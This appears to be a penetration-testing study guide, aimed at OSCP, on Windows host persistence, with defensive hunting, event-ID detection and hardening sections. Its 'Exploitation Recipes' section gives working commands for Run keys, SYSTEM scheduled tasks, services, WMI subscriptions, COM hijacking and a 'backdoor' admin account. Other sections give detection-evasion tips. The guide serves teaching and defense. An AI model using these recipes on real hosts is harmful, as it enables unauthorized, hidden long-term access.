## 1. Overview

Windows host persistence is the set of techniques that let an attacker
retain access to a compromised host across reboots, logoffs, and
partial remediation. Defense is the symmetric phase: detecting and
removing persistence, and hardening the host against it.

**Why host persistence matters:**

- A single host with persistence is a permanent foothold on the
  network.
- Many persistence techniques survive password rotations.
- Detection is often retrospective; persistence is found weeks later.
- Remediation requires knowing exactly what was changed.

**Technique families:**

| Family | Examples | Survives reboot | Noise |
|--------|----------|-----------------|-------|
| Registry | Run keys, Winlogon, IFEO | Yes | Low |
| Scheduled tasks | schtasks, Task Scheduler | Yes | Low |
| Services | New service, service reconfigure | Yes | Medium |
| Startup folder | Shortcut in Startup | Yes (on login) | Low |
| WMI subscriptions | Event-driven script | Yes | Low |
| COM hijacking | HKCU/HKLM CLSID override | Yes | Low |
| DLL hijacking | Search order, phantom | Yes | Low |
| Bootkits | MBR/VBR/UEFI | Yes | Very high |
| Account creation | Local admin user | Yes | Medium |

## 2. Reconnaissance / Enumeration

**Offensive - registry persistence:**

    # User-level Run keys
    reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

    # Machine-level Run keys
    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
    reg query HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run

    # Winlogon (Userinit, Shell)
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

    # IFEO (Image File Execution Options) - debugger hijack
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"

    # AppInit_DLLs
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs

**Offensive - scheduled tasks:**

    # All tasks (verbose)
    schtasks /query /fo LIST /v

    # Tasks running as SYSTEM
    Get-ScheduledTask | Where-Object { $_.Principal.UserId -eq "SYSTEM" }

    # Tasks with an unusual action
    Get-ScheduledTask | ForEach-Object { $_.Actions } | Select-Object Execute, Arguments

**Offensive - services:**

    # All services with binary paths and accounts
    wmic service get Name,DisplayName,PathName,StartMode,StartName

    # Non-Microsoft services
    Get-Service | Where-Object { $_.DisplayName -notmatch 'Microsoft' }

    # Recently created services (check event log 7045)
    Get-WinEvent -LogName System -FilterXPath "*[System[EventID=7045]]" -MaxEvents 20

**Offensive - startup folder:**

    dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
    dir "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup"

**Offensive - WMI subscriptions:**

    Get-WmiObject -Namespace root\subscription -Class __EventFilter
    Get-WmiObject -Namespace root\subscription -Class __EventConsumer
    Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding

**Offensive - COM hijacking:**

    # HKCU CLSID overrides (no admin required)
    reg query HKCU\Software\Classes\CLSID /s /f "InprocServer32"

    # Known vulnerable CLSIDs (compare against HKLM)

**Offensive - accounts:**

    net user
    net localgroup Administrators
    Get-LocalUser | Where-Object { $_.Enabled -eq $true }

**Offensive - automated:**

    # Autoruns (Sysinternals) - comprehensive
    autorunsc.exe -accepteula -a * -c -h -s -nobanner

    # PowerUp / SharpUp
    Import-Module .\PowerUp.ps1; Invoke-AllChecks
    .\SharpUp.exe audit

**Defensive - hunt persistence:**

    # Recently modified Run keys
    Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Get-Member -MemberType NoteProperty

    # Recently created scheduled tasks (last 7 days)
    Get-ScheduledTask | Where-Object { $_.Date -gt (Get-Date).AddDays(-7) }

    # Recently created services (event 7045)
    Get-WinEvent -FilterHashtable @{LogName='System';ID=7045;StartTime=(Get-Date).AddDays(-7)}

    # Recently created local accounts (event 4720)
    Get-WinEvent -FilterHashtable @{LogName='Security';ID=4720;StartTime=(Get-Date).AddDays(-7)}

**Defensive - audit logs to check:**

- Event 4657 (registry value modified).
- Event 4698 / 4702 (scheduled task created / updated).
- Event 7045 (service installed).
- Event 4720 (user account created).
- Event 4732 (member added to a security group).
- Event 4688 (process creation) with unusual parents.
- Sysmon events 11 (file create), 12/13/14 (registry), 19/20/21 (WMI).

## 3. Common Attack Vectors

**Registry persistence:**

- **Run / RunOnce keys** - execute on user logon; HKCU requires no admin.
- **Winlogon Userinit / Shell** - execute on user logon; HKLM requires
  admin.
- **IFEO Debugger** - hijack execution of a target binary; HKLM requires
  admin.
- **AppInit_DLLs** - inject a DLL into every user32.dll-loading process;
  HKLM requires admin.
- **COM hijacking** - override a CLSID in HKCU (no admin) or HKLM
  (admin).

**Scheduled tasks:**

- Create a task running as SYSTEM.
- Trigger: at logon, at startup, on idle, on event.
- Action: any executable, script, or COM handler.

**Services:**

- Create a new service (`sc create`).
- Reconfigure an existing service binary path.
- Modify an existing service's ACL.

**Startup folder:**

- Shortcut in `%APPDATA%\...\Startup` (user logon).
- Shortcut in `%ProgramData%\...\Startup` (any user logon).

**WMI subscriptions:**

- `__EventFilter` - condition.
- `__EventConsumer` - action (CommandLineEventConsumer or
  ActiveScriptEventConsumer).
- `__FilterToConsumerBinding` - link.
- Fileless; survives reboot; triggered by system events (process
  creation, logon, etc.).

**COM hijacking:**

- Find a CLSID loaded by a common process.
- Override it in HKCU with a malicious `InprocServer32` path.
- No admin required for HKCU.

**DLL hijacking:**

- Plant a malicious DLL in a writable search-order directory.
- Name it exactly as a legitimately missing DLL.
- Trigger the process.

**Account creation:**

- Create a local admin user (`net user` + `net localgroup`).
- Add an existing user to `Administrators`.
- Modify an existing user's password.

**Bootkits (rare, very stealthy):**

- MBR / VBR modification.
- UEFI implant (requires physical or firmware access).

## 4. Exploitation Recipes

**Registry Run key (user-level, no admin):**

    reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

    # Verify
    reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Updater

    # Expected output:
    # Updater    REG_SZ    C:\Windows\Temp\payload.exe

    # Triggers on next user logon.

**Registry Run key (machine-level, requires admin):**

    reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

    # Triggers on next logon for any user.

**Scheduled task as SYSTEM (requires admin):**

    schtasks /create /tn "Updater" /tr "C:\Windows\Temp\payload.exe" /sc onstart /ru SYSTEM /f

    # Verify
    schtasks /query /tn "Updater"

    # Expected output:
    # TaskName    Next Run Time    Status
    # Updater     N/A              Ready

    # Triggers on system startup.

    # With PowerShell (also works on non-admin for user-context tasks):
    $action = New-ScheduledTaskAction -Execute "C:\Windows\Temp\payload.exe"
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
    Register-ScheduledTask -TaskName "Updater" -Action $action -Trigger $trigger -Principal $principal

**Service creation (requires admin):**

    sc create Updater binPath= "C:\Windows\Temp\payload.exe" start= auto obj= LocalSystem

    # Or with PowerShell:
    New-Service -Name "Updater" -BinaryPathName "C:\Windows\Temp\payload.exe" -StartupType Automatic

    # Start it
    sc start Updater

    # Triggers on next boot.

**Startup folder (user-level, no admin):**

    copy payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Updater.exe"

    # Triggers on next user logon.

**WMI event subscription (requires admin for full persistence):**

    # 1. Create an event filter
    $FilterArgs = @{
        Name = 'UpdaterFilter'
        EventNamespace = 'root\cimv2'
        QueryLanguage = 'WQL'
        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    }
    $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

    # 2. Create an event consumer
    $ConsumerArgs = @{
        Name = 'UpdaterConsumer'
        CommandLineTemplate = "C:\Windows\Temp\payload.exe"
    }
    $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

    # 3. Bind them
    $BindingArgs = @{
        Filter = $Filter
        Consumer = $Consumer
    }
    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs

    # Verify
    Get-WmiObject -Namespace root\subscription -Class __EventFilter
    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer

**COM hijacking (HKCU, no admin):**

    # 1. Find a CLSID loaded by a common process
    #    (Process Monitor: filter for CLSID in registry accesses)
    #    Common targets: ShellWindows, MruPidlList, etc.

    # 2. Override the CLSID in HKCU
    reg add "HKCU\Software\Classes\CLSID\{<CLSID>}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\Temp\payload.dll" /f

    # 3. The DLL is loaded when the target process runs.

**Local admin user creation (requires admin):**

    net user backdoor <PASSWORD> /add
    net localgroup Administrators backdoor /add

    # Or with PowerShell:
    New-LocalUser -Name "backdoor" -Password (ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force)
    Add-LocalGroupMember -Group "Administrators" -Member "backdoor"

    # Verify
    net user backdoor
    net localgroup Administrators

## 5. Post-Exploitation

**After establishing persistence:**

- Verify persistence works: reboot the host (in a lab) or wait for the
  trigger.
- Document the technique used (for future reference and cleanup).
- Avoid stacking multiple persistence mechanisms on the same host
  (increases detection surface).
- Prefer user-level persistence (HKCU, Startup folder, user-context
  scheduled tasks) - it does not require admin and is often overlooked.

**Cleanup after use (blue team):**

- Enumerate all autoruns (Autoruns from Sysinternals).
- Compare against a baseline of known-good autoruns.
- Remove unexpected entries.
- Check event logs for the original modification.
- Reboot and verify the persistence does not return.

**Detection evasion:**

- Use legitimate Windows binaries (LOLBins) instead of custom
  executables.
- Use fileless persistence (WMI, PowerShell profiles).
- Use encoded or encrypted payloads.
- Blend in with legitimate task names and paths.

## 6. Risk Context

Host persistence is what turns a single compromise into a lasting
foothold:

- A single Run key can survive for years.
- WMI subscriptions are fileless and invisible to file-based
  detection.
- COM hijacking requires no admin and is often overlooked.
- Local admin accounts bypass most credential rotation.

**Blast radius:** a persistent host can be re-compromised at any time,
even after remediation of the original vector.

**Why attacks succeed:**

- Autoruns are numerous and rarely reviewed.
- WMI subscriptions are rare in legitimate software, but also rare in
  detection rules.
- COM hijacking is subtle and requires deep knowledge to detect.
- Account creation is often overlooked if the account looks legitimate.

## 7. Root Causes

- **Legitimate Windows features abused.** Run keys, WMI, COM - all
  designed for legitimate use.
- **No baseline of autoruns.** Impossible to detect anomalies without a
  baseline.
- **Weak monitoring.** 4657, 4698, 7045 events are often not alerted.
- **Privileged access not restricted.** Local admin grants almost every
  persistence technique.
- **No periodic review.** Autoruns are set once and never reviewed.

## 8. Preventive Controls

**Registry hardening:**

- Restrict write access to Run keys to administrators.
- Monitor 4657 for Run, Winlogon, IFEO modifications.
- Enable LSA Protection (RunAsPPL).

**Scheduled task hardening:**

- Restrict task creation to administrators.
- Monitor 4698 for unexpected tasks.
- Baseline legitimate tasks.

**Service hardening:**

- Restrict service creation to administrators.
- Monitor 7045 for unexpected services.
- Sign service binaries (WDAC).

**WMI hardening:**

- Restrict WMI subscription creation to administrators.
- Monitor event 5860 / 5861.
- Disable WMI where not needed.

**COM hardening:**

- Restrict HKCU CLSID overrides via policy.
- Monitor HKCU\Software\Classes\CLSID modifications.

**Account hardening:**

- Monitor 4720 (user created) and 4732 (member added to group).
- Restrict local admin group membership.
- Use LAPS for local admin passwords.

**General:**

- Enable PowerShell script block logging.
- Enable Sysmon with a modern configuration.
- Forward logs to a SIEM.
- Baseline and alert on changes.
- Use WDAC / AppLocker to restrict execution.

## 9. Detection Controls

**Registry persistence:**

- Event 4657 (registry value modified) - alert on Run, Winlogon, IFEO.
- Sysmon event 12 / 13 / 14 (registry events).
- Autoruns (Sysinternals) periodic review.

**Scheduled tasks:**

- Event 4698 (task created).
- Event 4702 (task updated).
- Event 106 (TaskScheduler operational).
- Sysmon event 1 with parent `schtasks.exe` or `taskeng.exe`.

**Services:**

- Event 7045 (service installed).
- Event 4697 (service installed via API).
- Sysmon event 13 (registry set) on service keys.

**WMI subscriptions:**

- Event 5860 / 5861 (WMI permanent subscription).
- Sysmon events 19 / 20 / 21 (WMI events).

**COM hijacking:**

- Sysmon event 12 / 13 / 14 with `\CLSID\` in the key path.
- Sysmon event 7 (image loaded) with unusual DLL paths.

**DLL hijacking:**

- Sysmon event 7 (image loaded) with DLLs from non-standard paths.
- Sysmon event 11 (file create) in writable directories.

**Account creation:**

- Event 4720 (user account created).
- Event 4722 (account enabled).
- Event 4732 (member added to security group).
- Event 4724 (password reset).

**General:**

- Honeytokens: fake user accounts, fake service names.
- Baseline normal autoruns; alert on new entries.

## 10. Verification

**Offensive - is persistence in place?**

- Registry: the key exists and points to the payload.
- Scheduled task: `schtasks /query` shows the task; it runs on trigger.
- Service: `sc query` shows the service; it starts on boot.
- WMI: `Get-WmiObject` shows the filter, consumer, and binding.
- Account: `net user` shows the account; it works for logon.

**Defensive - are controls effective?**

- Test registry persistence: new Run key generates 4657; alert fires.
- Test task persistence: new task generates 4698; alert fires.
- Test service persistence: new service generates 7045; alert fires.
- Test WMI persistence: new subscription generates 5860; alert fires.
- Test COM hijack: HKCU CLSID override generates Sysmon 13; alert fires.
- Test account creation: new user generates 4720; alert fires.
- Verify baseline: autoruns review shows no unexpected entries.

## 11. OSCP Notes

- Persistence is rarely required in OSCP (time-boxed exam), but appears
  in OSCP-like labs and is essential for real engagements.
- Common techniques to practice: Run keys, scheduled tasks, service
  creation.
- **Capture screenshots** of:
  - The persistence mechanism created (registry key, task, service).
  - The persistence verification (reboot or trigger).
  - The successful re-access after trigger.
- The `> [!IMPORTANT]` OSCP reporting note applies to the persistence
  verification step.

## 12. Production Notes

- Modern EDR detects most persistence techniques within seconds:
  - Run key modifications - Sysmon + EDR alert.
  - Scheduled task creation - 4698 + EDR alert.
  - Service creation - 7045 + EDR alert.
  - WMI subscriptions - 5860 + EDR alert.
- In mature environments, use fileless persistence (WMI, COM hijacking)
  or legitimate tools (PsExec for lateral, not persistence).
- Prefer user-level persistence (HKCU, Startup folder) - less likely
  to be alerted.
- Assume persistence is detected; plan for one-shot access rather than
  long-term persistence.
- Cleanup after red team: remove all persistence before disengaging.

## 13. References

**Microsoft documentation:**

- [Run and RunOnce Registry Keys](https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys)
- [Task Scheduler](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page)
- [WMI Event Subscription](https://learn.microsoft.com/en-us/windows/win32/wmisdk/monitoring-events)
- [COM Hijacking Mitigation](https://learn.microsoft.com/en-us/windows/win32/com/com-hijacking)

**MITRE ATT&CK:**

- [Persistence - Registry Run Keys / Startup Folder (T1547.001)](https://attack.mitre.org/techniques/T1547/001/)
- [Persistence - Scheduled Task/Job (T1053)](https://attack.mitre.org/techniques/T1053/)
- [Persistence - Create or Modify System Process: Windows Service (T1543.003)](https://attack.mitre.org/techniques/T1543/003/)
- [Persistence - Event Triggered Execution: WMI Event Subscription (T1546.003)](https://attack.mitre.org/techniques/T1546/003/)
- [Persistence - Hijack Execution Flow: COM Hijacking (T1546.015)](https://attack.mitre.org/techniques/T1546/015/)

**Tools:**

- [Autoruns](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)
- [Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
- [SharpUp](https://github.com/GhostPack/SharpUp)

**Research:**

- [HackTricks - Windows Persistence](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [MITRE ATT&CK - Windows Persistence](https://attack.mitre.org/tactics/TA0003/)
- [SwiftOnSecurity Sysmon Config](https://github.com/SwiftOnSecurity/sysmon-config)